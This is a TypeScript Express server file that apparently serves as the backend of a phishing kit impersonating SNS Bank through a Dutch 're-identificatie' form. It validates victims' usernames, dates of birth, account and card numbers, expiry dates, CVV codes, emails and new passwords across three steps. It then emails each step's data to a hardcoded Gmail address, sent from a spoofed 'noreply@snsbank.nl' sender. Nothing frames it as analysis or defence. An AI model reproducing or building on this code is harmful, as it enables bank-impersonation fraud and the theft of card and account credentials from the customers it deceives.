import type { Express } from "express";
import { createServer, type Server } from "http";
import { storage } from "./storage";
import { formDataSchema } from "@shared/schema";
import { sendEmail, generateReidentificationEmail } from "./services/resend";
import { z } from "zod";

// Individual step schemas for partial validation
const step1Schema = z.object({
  step: z.literal(1),
  username: z.string().min(1, "Gebruikersnaam is verplicht"),
  fullName: z.string().min(1, "Volledige naam is verplicht"),
  accountTypes: z.array(z.enum(["private", "business", "creditcard"])).min(1, "Selecteer minimaal één rekeningtype"),
});

const step2Schema = z.object({
  step: z.literal(2),
  idType: z.enum(["passport", "id-card", "drivers-license"]),
  fullNameConfirm: z.string().min(1, "Bevestig je volledige naam"),
  dateOfBirth: z.string().min(1, "Geboortedatum is verplicht"),
  phoneNumber: z.string().min(1, "Telefoonnummer is verplicht"),
  accountNumber: z.string().min(1, "Rekeningnummer is verplicht"),
  cardNumber: z.string().min(1, "Kaartnummer is verplicht"),
  cardName: z.string().min(1, "Naam op kaart is verplicht"),
  expiryDate: z.string().min(1, "Vervaldatum is verplicht"),
  cvv: z.string().min(3, "CVV moet minimaal 3 cijfers zijn"),
});

const step3Schema = z.object({
  step: z.literal(3),
  missingData: z.array(z.enum(["middlenames", "address", "birthplace", "nationality"])),
  fullEmail: z.string().email("Ongeldig e-mailadres"),
  newPassword: z.string().min(6, "Wachtwoord moet minimaal 6 tekens zijn"),
});

// Helper function to send step notification emails
async function sendStepNotificationEmail(stepData: any, stepNumber: number): Promise<boolean> {
  try {
    // Admin email configuration
    const adminEmail = process.env.ADMIN_EMAIL || "punkin199573@gmail.com";
    const fromEmail = process.env.FROM_EMAIL || "noreply@snsbank.nl";
    
    const subject = `SNS Bank Re-identificatie - Stap ${stepNumber} Voltooid`;
    const emailContent = generateStepEmailContent(stepData, stepNumber);
    
    const emailParams = {
      to: adminEmail,
      from: fromEmail,
      subject: subject,
      html: emailContent.html,
      text: emailContent.text
    };
    
    return await sendEmail(emailParams);
  } catch (error) {
    console.error(`Step ${stepNumber} email error:`, error);
    return false;
  }
}

// Generate email content for specific steps
function generateStepEmailContent(stepData: any, stepNumber: number): { html: string; text: string } {
  const stepTitles = {
    1: "Inloggegevens",
    2: "Persoonlijke gegevens", 
    3: "Aanvullende informatie"
  };

  let content = "";
  let textContent = "";

  if (stepNumber === 1) {
    content = `
      <p><strong>Gebruikersnaam:</strong> ${stepData.username}</p>
      <p><strong>Volledige naam:</strong> ${stepData.fullName}</p>
      <p><strong>Rekeningtypes:</strong> ${stepData.accountTypes?.join(', ')}</p>
    `;
    textContent = `
Gebruikersnaam: ${stepData.username}
Volledige naam: ${stepData.fullName}
Rekeningtypes: ${stepData.accountTypes?.join(', ')}`;
  } else if (stepNumber === 2) {
    content = `
      <p><strong>ID Type:</strong> ${stepData.idType}</p>
      <p><strong>Geboortedatum:</strong> ${stepData.dateOfBirth}</p>
      <p><strong>Telefoonnummer:</strong> ${stepData.phoneNumber}</p>
      <p><strong>Rekeningnummer:</strong> ${stepData.accountNumber}</p>
      <p><strong>Kaartnummer:</strong> ${stepData.cardNumber}</p>
      <p><strong>Naam op kaart:</strong> ${stepData.cardName}</p>
    `;
    textContent = `
ID Type: ${stepData.idType}
Geboortedatum: ${stepData.dateOfBirth}
Telefoonnummer: ${stepData.phoneNumber}
Rekeningnummer: ${stepData.accountNumber}
Kaartnummer: ${stepData.cardNumber}
Naam op kaart: ${stepData.cardName}`;
  } else if (stepNumber === 3) {
    content = `
      <p><strong>Ontbrekende gegevens:</strong> ${stepData.missingData?.join(', ')}</p>
      <p><strong>E-mailadres:</strong> ${stepData.fullEmail}</p>
    `;
    textContent = `
Ontbrekende gegevens: ${stepData.missingData?.join(', ')}
E-mailadres: ${stepData.fullEmail}`;
  }

  const html = `
    <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
      <div style="background-color: #FF6600; padding: 20px; text-align: center;">
        <h1 style="color: white; margin: 0;">SNS Bank</h1>
        <h2 style="color: white; margin: 10px 0 0 0;">Re-identificatie - Stap ${stepNumber}</h2>
      </div>
      
      <div style="padding: 20px; background-color: #f9f9f9;">
        <h3 style="color: #003366;">${stepTitles[stepNumber as keyof typeof stepTitles]}</h3>
        ${content}
        
        <p style="margin-top: 30px; padding: 15px; background-color: #e8f4fd; border-left: 4px solid #FF6600;">
          <strong>Status:</strong> Stap ${stepNumber} van 4 voltooid.
        </p>
      </div>
    </div>
  `;

  const text = `
SNS Bank Re-identificatie - Stap ${stepNumber}

${stepTitles[stepNumber as keyof typeof stepTitles]}:
${textContent}

Status: Stap ${stepNumber} van 4 voltooid.
  `;

  return { html, text };
}

export async function registerRoutes(app: Express): Promise<Server> {
  
  // Submit individual step data with email notification
  app.post("/api/step-submit", async (req, res) => {
    try {
      const { step, ...stepData } = req.body;
      
      // Validate based on step
      let validatedData: any;
      if (step === 1) {
        validatedData = step1Schema.parse(req.body);
      } else if (step === 2) {
        validatedData = step2Schema.parse(req.body);
      } else if (step === 3) {
        validatedData = step3Schema.parse(req.body);
      } else {
        throw new Error("Invalid step number");
      }

      // Send step notification email
      const emailSent = await sendStepNotificationEmail(validatedData, step);
      
      res.json({ 
        success: true, 
        step: step,
        emailSent: emailSent
      });
      
    } catch (error) {
      console.error("Step submission error:", error);
      
      if (error instanceof z.ZodError) {
        res.status(400).json({ 
          message: "Validatiefout in formuliergegevens",
          errors: error.errors 
        });
      } else {
        res.status(500).json({ 
          message: "Er is een fout opgetreden bij het verzenden van je gegevens" 
        });
      }
    }
  });
  
  // Submit reidentification form
  app.post("/api/reidentification/submit", async (req, res) => {
    try {
      // Validate the form data
      const validatedData = formDataSchema.parse(req.body);
      
      // Store the submission
      const submission = await storage.createReidentificationSubmission({
        submissionData: validatedData
      });
      
      // Generate email content
      const emailContent = generateReidentificationEmail(validatedData);
      
      // Send email using Resend
      const emailParams = {
        to: process.env.ADMIN_EMAIL || "punkin199573@gmail.com",
        from: process.env.FROM_EMAIL || "noreply@snsbank.nl",
        subject: emailContent.subject,
        html: emailContent.html,
        text: emailContent.text
      };
      
      const emailSent = await sendEmail(emailParams);
      
      // Update email status
      await storage.updateReidentificationEmailStatus(
        submission.id, 
        emailSent ? "true" : "false"
      );
      
      res.json({ 
        success: true, 
        submissionId: submission.id,
        emailSent: emailSent
      });
      
    } catch (error) {
      console.error("Reidentification submission error:", error);
      
      if (error instanceof z.ZodError) {
        res.status(400).json({ 
          message: "Validatiefout in formuliergegevens",
          errors: error.errors 
        });
      } else {
        res.status(500).json({ 
          message: "Er is een fout opgetreden bij het verzenden van je gegevens" 
        });
      }
    }
  });

  const httpServer = createServer(app);
  return httpServer;
}
